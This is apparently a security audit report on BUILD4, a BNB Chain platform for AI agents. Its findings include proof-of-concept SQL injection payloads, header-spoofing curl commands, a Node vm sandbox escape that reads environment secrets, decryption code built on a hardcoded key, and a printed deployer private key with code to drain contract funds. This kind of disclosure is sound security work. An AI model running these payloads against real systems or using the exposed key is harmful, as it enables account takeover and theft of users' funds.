Executive Summary

Kairos Lab Security Research conducted a comprehensive security audit of BUILD4, a decentralized infrastructure platform for autonomous AI agents on BNB Chain. The audit covered 6 deployed smart contracts, a Node.js/Express backend, a Telegram bot (868KB of code), trading and token launch systems, and Twitter/social agents.

The platform is NOT safe for production deployment. We identified multiple critical vulnerabilities that allow an attacker to steal all user funds, execute arbitrary code on the server, and take over any user account without authentication.

KSR-B4-C01

Hardcoded Encryption Key for All User Private Keys

CRITICAL
CVSS 4.010.0
CWECWE-798
Locationserver/storage.ts:87
StatusOpen

Description

All user wallet private keys are encrypted using AES-256-GCM, but the encryption key is derived from a hardcoded default value in the open-source codebase. If WALLET_ENCRYPTION_KEY is not set in environment variables, the key defaults to "build4-beehave-prod-stable-encryption-key-2026". The PBKDF2 salt is also hardcoded: "build4-platform-v2". Since the code is public on GitHub, anyone can derive the encryption key and decrypt all stored private keys.

Impact

Complete compromise of ALL user wallets. An attacker with database read access (via SQLi or DB breach) can decrypt every private key and drain every wallet.

Proof of Concept

// Reproduce with Node.js
const crypto = require('crypto');
const STABLE_KEY = "build4-beehave-prod-stable-encryption-key-2026";
const SALT = "build4-platform-v2";
const key = crypto.pbkdf2Sync(STABLE_KEY, SALT, 100000, 32, "sha512");

// Now decrypt any encrypted_private_key from DB:
function decrypt(ciphertext) {
  const [ivHex, tagHex, encrypted] = ciphertext.split(":");
  const iv = Buffer.from(ivHex, "hex");
  const tag = Buffer.from(tagHex, "hex");
  const decipher = crypto.createDecipheriv("aes-256-gcm", key, iv);
  decipher.setAuthTag(tag);
  return decipher.update(encrypted, "hex", "utf8") + decipher.final("utf8");
}

Remediation

1. Immediately rotate to a unique, high-entropy encryption key stored in a secrets manager (AWS KMS, HashiCorp Vault, or at minimum a non-committed .env file). 2. Re-encrypt all existing private keys with the new key. 3. Remove the hardcoded default entirely — fail closed if the key is not configured. 4. Consider using HSM-backed key management for production.

KSR-B4-C02

SQL Injection via sql.raw() in Quest Completion

CRITICAL
CVSS 4.09.1
CWECWE-89
Locationserver/routes.ts:1262-1263
StatusOpen

Description

The /api/quests/complete endpoint uses sql.raw() with string interpolation to build a SQL query. The wallet parameter from the request body is "sanitized" by replacing single quotes, but this is trivially bypassable.

Proof of Concept

// Malicious request:
POST /api/quests/complete
{"wallet": "0x0') UNION SELECT encrypted_private_key FROM telegram_wallets--", "questId": "join"}

// The resulting SQL becomes:
// SELECT chat_id FROM telegram_wallets WHERE LOWER(wallet_address) = LOWER('0x0')
// UNION SELECT encrypted_private_key FROM telegram_wallets--') LIMIT 1

Remediation

Replace sql.raw() with Drizzle ORM's parameterized query builder:

// BEFORE (vulnerable):
db.execute(sql.raw(`SELECT ... LOWER('${wallet.replace(/'/g, "''")}') LIMIT 1`))

// AFTER (safe):
db.select().from(telegramWallets)
  .where(eq(sql`LOWER(${telegramWallets.walletAddress})`, wallet.toLowerCase()))
  .limit(1)
KSR-B4-C03

Zero Authentication on MiniApp API (Header Spoofing)

CRITICAL
CVSS 4.09.8
CWECWE-287
Locationserver/miniapp-routes.ts:78-117
StatusOpen

Description

All MiniApp API endpoints authenticate users solely via the x-telegram-chat-id HTTP header, which is user-supplied and completely spoofable. There is no Telegram initData HMAC verification, no session token, no JWT — just a raw, unverified header. Any HTTP client can impersonate any user by setting this header to the victim's Telegram chat ID.

Proof of Concept

# View any user's account:
curl -H "x-telegram-chat-id: 123456789" https://build4.io/api/miniapp/account

# Import attacker's wallet into victim's account:
curl -X POST https://build4.io/api/miniapp/import-wallet \
  -H "x-telegram-chat-id: 123456789" \
  -H "Content-Type: application/json" \
  -d '{"privateKey": "0xATTACKER_KEY"}'

# Execute trades as victim:
curl -X POST https://build4.io/api/miniapp/trade \
  -H "x-telegram-chat-id: 123456789" \
  -H "Content-Type: application/json" \
  -d '{"symbol": "BTCUSDT", "side": "BUY", "amount": "1000"}'

Remediation

Implement Telegram WebApp initData validation using HMAC-SHA256 verification as per Telegram's official documentation. Validate the hash parameter against the bot token on every request. Add session management with signed JWTs after initial verification.

KSR-B4-C04

Node.js VM Sandbox Escape → Remote Code Execution

CRITICAL
CVSS 4.09.8
CWECWE-94
Locationserver/skill-executor.ts:158-210
StatusOpen

Description

The skill execution engine uses Node.js vm module to sandbox user-provided code. The vm module is explicitly documented by Node.js as NOT a security mechanism. The regex-based validation (validateSkillCode) checks for forbidden patterns like require(, process., Function(, etc., but these can be bypassed through prototype chain access, Unicode tricks, or obfuscation.

Proof of Concept

// Classic VM escape via constructor chain:
const code = `
  const ForeignObject = this.constructor;
  const ForeignFunction = ForeignObject.constructor;
  const proc = ForeignFunction("return this")().process;
  const env = proc.env;
  __result__ = {
    DATABASE_URL: env.DATABASE_URL,
    WALLET_KEY: env.WALLET_ENCRYPTION_KEY,
    TELEGRAM_TOKEN: env.TELEGRAM_BOT_TOKEN,
    ALL_KEYS: Object.keys(env)
  };
`;
// The regex won't catch "this.constructor" (only "constructor[" is blocked)

Remediation

Replace vm with a proper sandboxing solution: isolated-vm (V8 isolate-based), vm2 (deprecated but better), or ideally a WebAssembly-based sandbox like quickjs-emscripten. Add a strict CSP-like allowlist for the sandbox context. Run skill code in a separate process with minimal privileges.

KSR-B4-C12

Deployer Private Key Hardcoded in .replit Config

CRITICAL
CVSS 4.010.0
CWECWE-798
Location.replit:56
StatusOpen

Description

The .replit configuration file contains the deployer's private key in plaintext: DEPLOYER_PRIVATE_KEY = "fbb5ce6442238283335abf13d09d2419827a7f60774cda24f610097ecafa87de". This key was used to deploy all 6 smart contracts on BSC. Since the repository is public on GitHub, the key is already compromised. The project's own replit.md acknowledges this key is exposed.

Impact

Anyone with this key can call owner-only functions on all deployed contracts: drain staked tokens, manipulate agent balances, modify fee structures, deactivate the entire platform. If the deployer wallet still holds BNB, those funds are also at risk.

Proof of Concept

// Import the exposed key and interact with any deployed contract
const { ethers } = require('ethers');
const provider = new ethers.JsonRpcProvider('https://bsc-dataseed.binance.org');
const wallet = new ethers.Wallet(
  'fbb5ce6442238283335abf13d09d2419827a7f60774cda24f610097ecafa87de',
  provider
);
// wallet is now the owner of all contracts — can call any onlyOwner function
const staking = new ethers.Contract(STAKING_ADDR, ABI, wallet);
await staking.emergencyWithdraw(); // drain all staked tokens

Remediation

1. Immediately transfer ownership of all contracts to a new address controlled by a fresh key. 2. Drain any remaining funds from the compromised deployer wallet. 3. Remove the private key from the repository and all git history (git filter-repo). 4. Use a hardware wallet or multisig for future deployments. 5. Never store private keys in config files.

KSR-B4-H16

CORS Origin Bypass via Wildcard Matching

HIGH
CVSS 4.07.5
CWECWE-346
Locationserver/index.ts:107-110

Description

The CORS origin validation uses origin.includes("walletconnect") to whitelist origins. An attacker can register a domain like evil-walletconnect.com or walletconnect.attacker.com and pass the CORS check, enabling cross-origin requests with credentials to the BUILD4 API from a malicious site.

Proof of Concept

// Attacker hosts JavaScript on https://walletconnect.evil.com
// Browser sends: Origin: https://walletconnect.evil.com
// Server check: "walletconnect.evil.com".includes("walletconnect") === true
// CORS header returned: Access-Control-Allow-Origin: https://walletconnect.evil.com
// Attacker can now make authenticated cross-origin requests

Remediation

Replace .includes() with exact origin matching against a whitelist array. Use === comparison or validate the full hostname suffix.

HIGH
CVSS 4.08.6
CWECWE-89
Locationserver/storage.ts (30+ sql.raw() calls)

Description

Beyond the single SQLi in routes.ts (C02), storage.ts contains 30+ instances of sql.raw() with string interpolation across search, analytics, leaderboard, referral, and wallet management functions. Many accept user-controlled parameters that flow through from API routes, Telegram commands, or agent queries. This is not a single vulnerability but a systemic pattern throughout the entire data layer.

Proof of Concept

// Example: searchAgents() in storage.ts
db.execute(sql.raw(`SELECT * FROM agents WHERE LOWER(name) LIKE LOWER('%${query}%')`))
// Inject: query = "') UNION SELECT encrypted_private_key FROM telegram_wallets--"

// Example: getLeaderboard() in storage.ts
db.execute(sql.raw(`SELECT ... ORDER BY ${sortField} ${sortDir} LIMIT ${limit}`))
// Inject: sortField = "(SELECT encrypted_private_key FROM telegram_wallets LIMIT 1)"

Remediation

Systematic audit and replacement of ALL sql.raw() calls with Drizzle ORM's parameterized query builder. Use sql`...${param}...` template literals (which auto-parameterize) instead of sql.raw(`...${param}...`) (which does not).

KSR-B4-H18

Debug Balance Endpoint Leaks Sensitive Data in Production

HIGH
CVSS 4.07.5
CWECWE-489
Locationserver/miniapp-routes.ts:6-76

Description

The /api/miniapp/debug-balance endpoint is a debug tool left active in production. It accepts an unauthenticated chatId parameter and returns detailed wallet information, balances, transaction history, and internal state for any user. Combined with the zero-auth MiniApp API (C03), this provides a complete reconnaissance tool.

Remediation

Remove the debug endpoint entirely, or gate it behind admin authentication and a NODE_ENV !== 'production' check.

KSR-B4-H19

CSP Allows unsafe-inline and unsafe-eval in Production

HIGH
CVSS 4.06.8
CWECWE-1021
Locationserver/index.ts:126

Description

The Content Security Policy header includes 'unsafe-inline' and 'unsafe-eval' directives, effectively negating XSS protection. Any injection point (including the SEO prerender HTML injection in M05) can execute arbitrary JavaScript in the user's browser context.

Remediation

Remove 'unsafe-inline' and 'unsafe-eval'. Use nonce-based CSP for inline scripts. Refactor any code that relies on eval().

KSR-B4-H20

Simulated ZK Proofs — Fake Groth16 in zerc20-sdk

HIGH
CVSS 4.08.2
CWECWE-345
Locationserver/zerc20-sdk (Poseidon hash + Groth16)

Description

The zerc20-sdk claims to implement Groth16 zero-knowledge proofs for private transactions, but the implementation is entirely simulated. The Poseidon hash uses truncated JavaScript arithmetic (loses precision on large values), and the "proof generation" produces deterministic fake proofs that pass the local "verifier" but have no cryptographic validity. Any user relying on ZERC20 for transaction privacy has zero actual privacy.

Remediation

Either implement real ZK proofs using a proper library (snarkjs, circom) with a trusted setup, or remove the ZK claims entirely and label the feature as experimental/simulated.

KSR-B4-H21

Unlimited ERC20 Approval (type(uint256).max) Client-Side

HIGH
CVSS 4.07.5
CWECWE-863
Locationclient/src/hooks (DeFi hooks)

Description

Client-side DeFi hooks request type(uint256).max (infinite) token approvals to router contracts. If any approved contract is compromised or has an upgrade path, all approved tokens can be drained from user wallets without further interaction. Users are never informed of the risk or given the option to approve exact amounts.

Remediation

Default to exact-amount approvals. If using unlimited approvals for UX, clearly inform the user and provide a "revoke" mechanism. Implement approval amount as a user-configurable setting.

KSR-B4-H22

Shared Auth Token Across All Analytics Sessions

HIGH
CVSS 4.06.5
CWECWE-384
Locationserver/admin-auth.ts

Description

The analytics dashboard uses a single shared HMAC-derived token for all sessions. There is no per-session token, no expiration, and no revocation mechanism. If the token is leaked (logs, browser history, shoulder surfing), all analytics access is permanently compromised with no way to invalidate the token without changing the server secret.

Remediation

Implement per-session tokens with expiration (JWT with short TTL). Add session revocation. Use HttpOnly, Secure cookies instead of URL-based tokens.
